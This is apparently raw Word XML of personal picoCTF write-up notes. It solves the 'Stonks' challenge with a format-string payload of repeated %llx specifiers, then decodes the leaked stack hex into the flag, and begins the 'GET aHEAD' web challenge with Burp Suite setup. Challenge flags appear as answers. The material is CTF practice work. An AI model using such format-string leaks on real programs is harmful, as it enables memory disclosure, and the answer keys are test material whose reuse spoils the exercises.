          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>""</w:t>
      </w:r>
      <w:r w:rsidRPr="00313A37">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18482959" w14:textId="77777777" w:rsidR="00886D6D" w:rsidRPr="00313A37" w:rsidRDefault="00886D6D" w:rsidP="00886D6D">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="1E1E1E"/>
        <w:spacing w:line="330" w:lineRule="atLeast"/>
        <w:ind w:firstLine="528"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1ECD59CE" w14:textId="77777777" w:rsidR="00886D6D" w:rsidRPr="00886D6D" w:rsidRDefault="00886D6D" w:rsidP="00886D6D">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="1E1E1E"/>
        <w:spacing w:line="330" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00886D6D">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00886D6D">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>{16_bits_inst34d_of_8_04c0760d}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51E99DF1" w14:textId="0CC3AE2F" w:rsidR="00313A37" w:rsidRDefault="00313A37" w:rsidP="00740B7E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49FE06AF" w14:textId="31533799" w:rsidR="00886D6D" w:rsidRDefault="00886D6D" w:rsidP="00740B7E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2AEB41DE" w14:textId="77777777" w:rsidR="00886D6D" w:rsidRPr="00886D6D" w:rsidRDefault="00886D6D" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00886D6D">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Stonks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E4AAD67" w14:textId="77777777" w:rsidR="00886D6D" w:rsidRPr="00886D6D" w:rsidRDefault="00886D6D" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00886D6D">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>| 20 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31EB1465" w14:textId="77777777" w:rsidR="00886D6D" w:rsidRPr="00886D6D" w:rsidRDefault="00886D6D" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00886D6D">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="227A4793" w14:textId="77777777" w:rsidR="00886D6D" w:rsidRPr="00886D6D" w:rsidRDefault="00886D6D" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4818A6EC" w14:textId="77777777" w:rsidR="00886D6D" w:rsidRPr="00886D6D" w:rsidRDefault="00886D6D" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00886D6D">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">Author: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00886D6D">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>madStacks</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="74C88160" w14:textId="77777777" w:rsidR="00886D6D" w:rsidRPr="00886D6D" w:rsidRDefault="00886D6D" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00886D6D">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B183151" w14:textId="77777777" w:rsidR="00886D6D" w:rsidRPr="00886D6D" w:rsidRDefault="00886D6D" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15D6566C" w14:textId="77777777" w:rsidR="00886D6D" w:rsidRDefault="00886D6D" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00886D6D">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>I decided to try something no</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00886D6D">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">one else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00886D6D">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>vuln.c</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00886D6D">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6088C21F" w14:textId="396A3586" w:rsidR="00886D6D" w:rsidRDefault="00886D6D" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00886D6D">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>nc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00886D6D">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> mercury.picoctf.net 53437</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A94167E" w14:textId="632F6385" w:rsidR="006B4BC9" w:rsidRDefault="006B4BC9" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">memory overflow with a long string </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C9C110B" w14:textId="74F894C4" w:rsidR="006B4BC9" w:rsidRDefault="006B4BC9" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7F700D39" wp14:editId="11710F72">
            <wp:extent cx="6332220" cy="1691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47"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="1691005"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1104BC1A" w14:textId="77777777" w:rsidR="006B4BC9" w:rsidRPr="006B4BC9" w:rsidRDefault="006B4BC9" w:rsidP="006B4BC9">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="1E1E1E"/>
        <w:spacing w:line="330" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006B4BC9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx|%llx</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D25F99E" w14:textId="64E60B99" w:rsidR="006B4BC9" w:rsidRDefault="006B4BC9" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6857C751" w14:textId="144692DD" w:rsidR="006B4BC9" w:rsidRDefault="006B4BC9" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="727CDCA8" w14:textId="3B2A17F6" w:rsidR="006B4BC9" w:rsidRDefault="006B4BC9" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="58E606D1" w14:textId="59445FD0" w:rsidR="006B4BC9" w:rsidRDefault="006B4BC9" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006B4BC9">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>7b4654436f636970|345f7435306c5f49|306d5f796d5f6c6c|346364625f79336e|ffe8007d61653532</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F1C9EE2" w14:textId="37C59D37" w:rsidR="006B4BC9" w:rsidRDefault="006B4BC9" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Hex 0x70 = p</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1269793A" w14:textId="498797D2" w:rsidR="006B4BC9" w:rsidRDefault="006B4BC9" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>0x69=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="71D82A5A" w14:textId="5DEE151F" w:rsidR="006B4BC9" w:rsidRDefault="006B4BC9" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>0x7d =}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2636BE28" w14:textId="2FE0436E" w:rsidR="006B4BC9" w:rsidRDefault="006B4BC9" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Change the hex value from little endian to big endian:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="362E78E2" w14:textId="77777777" w:rsidR="006B4BC9" w:rsidRPr="00313A37" w:rsidRDefault="006B4BC9" w:rsidP="006B4BC9">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006B4BC9">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>7069636F4354467B495F6C3035745F346C6C5F6D795F6D306e33795f62646334323565617d</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17B9E53B" w14:textId="77777777" w:rsidR="006B4BC9" w:rsidRDefault="006B4BC9" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="621E0A5B" w14:textId="77777777" w:rsidR="006B4BC9" w:rsidRDefault="006B4BC9" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="233F0C7A" w14:textId="29392A3A" w:rsidR="006B4BC9" w:rsidRDefault="006B4BC9" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B4BC9">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B4BC9">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>{I_l05t_4ll_my_m0n3y_bdc425ea}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1115C08D" w14:textId="0A888DA9" w:rsidR="00DD60A3" w:rsidRDefault="00DD60A3" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="33AF34DB" w14:textId="638B92B1" w:rsidR="00DD60A3" w:rsidRDefault="00DD60A3" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C878808" w14:textId="195AAA43" w:rsidR="00DD60A3" w:rsidRDefault="00DD60A3" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Web exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19BEB851" w14:textId="77777777" w:rsidR="00DD60A3" w:rsidRDefault="00DD60A3" w:rsidP="00886D6D">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="33E4A64A" w14:textId="77777777" w:rsidR="00DD60A3" w:rsidRPr="00DD60A3" w:rsidRDefault="00DD60A3" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD60A3">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">GET </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD60A3">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>aHEAD</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="65CC3248" w14:textId="77777777" w:rsidR="00DD60A3" w:rsidRPr="00DD60A3" w:rsidRDefault="00DD60A3" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD60A3">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>| 20 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65B1E658" w14:textId="77777777" w:rsidR="00DD60A3" w:rsidRPr="00DD60A3" w:rsidRDefault="00DD60A3" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD60A3">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74DEB746" w14:textId="77777777" w:rsidR="00DD60A3" w:rsidRPr="00DD60A3" w:rsidRDefault="00DD60A3" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F29FB8E" w14:textId="77777777" w:rsidR="00DD60A3" w:rsidRPr="00DD60A3" w:rsidRDefault="00DD60A3" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD60A3">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">Author: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD60A3">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>madStacks</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="28A44BA2" w14:textId="77777777" w:rsidR="00DD60A3" w:rsidRPr="00DD60A3" w:rsidRDefault="00DD60A3" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD60A3">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41F63F8C" w14:textId="77777777" w:rsidR="00DD60A3" w:rsidRPr="00DD60A3" w:rsidRDefault="00DD60A3" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A1E8196" w14:textId="27690725" w:rsidR="00DD60A3" w:rsidRDefault="00DD60A3" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD60A3">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">Find the flag being held on this server to get ahead of the competition </w:t>
      </w:r>
      <w:hyperlink r:id="rId48" w:history="1">
        <w:r w:rsidR="00222A2A" w:rsidRPr="004C12C8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-CA"/>
          </w:rPr>
          <w:t>http://mercury.picoctf.net:21939/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0343E5F2" w14:textId="5ED91DAC" w:rsidR="002E7CDC" w:rsidRDefault="002E7CDC" w:rsidP="00DD60A3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76BFF94F" w14:textId="7509BE24" w:rsidR="002E7CDC" w:rsidRPr="002E7CDC" w:rsidRDefault="002E7CDC" w:rsidP="002E7CDC">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Hints:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DCC387F" w14:textId="77777777" w:rsidR="002E7CDC" w:rsidRPr="002E7CDC" w:rsidRDefault="002E7CDC" w:rsidP="002E7CDC">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5EA03015" w14:textId="77777777" w:rsidR="002E7CDC" w:rsidRPr="002E7CDC" w:rsidRDefault="002E7CDC" w:rsidP="002E7CDC">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E7CDC">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">    Maybe you have more than 2 choices</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42618E90" w14:textId="77777777" w:rsidR="002E7CDC" w:rsidRPr="002E7CDC" w:rsidRDefault="002E7CDC" w:rsidP="002E7CDC">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A54487F" w14:textId="224D6E7E" w:rsidR="002E7CDC" w:rsidRDefault="002E7CDC" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E7CDC">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">Check out tools like </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002E7CDC">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Burpsuite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002E7CDC">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> to modify your requests and look at the responses</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BBD9016" w14:textId="0F948ABA" w:rsidR="00E50ED3" w:rsidRDefault="00E50ED3" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="509AC8D4" w14:textId="6E190FE4" w:rsidR="00E50ED3" w:rsidRDefault="00E50ED3" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">Setup </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>burpsuite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>firefox</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="52838827" w14:textId="1B0B106B" w:rsidR="00E50ED3" w:rsidRDefault="00E50ED3" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1281A0F5" w14:textId="12088071" w:rsidR="00E50ED3" w:rsidRDefault="00E50ED3" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6B3433AF" w14:textId="0C04A315" w:rsidR="00E50ED3" w:rsidRDefault="00E50ED3" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Firefox-&gt;preferences-&gt; search for proxy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28F125B0" w14:textId="77777777" w:rsidR="00E50ED3" w:rsidRDefault="00E50ED3" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C7E91E1" w14:textId="7F2A920E" w:rsidR="00E50ED3" w:rsidRDefault="00E50ED3" w:rsidP="00E50ED3">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="64CC235B" wp14:editId="6EAC9690">
            <wp:extent cx="6332220" cy="397637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9"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="3976370"/>
                    </a:xfrm>
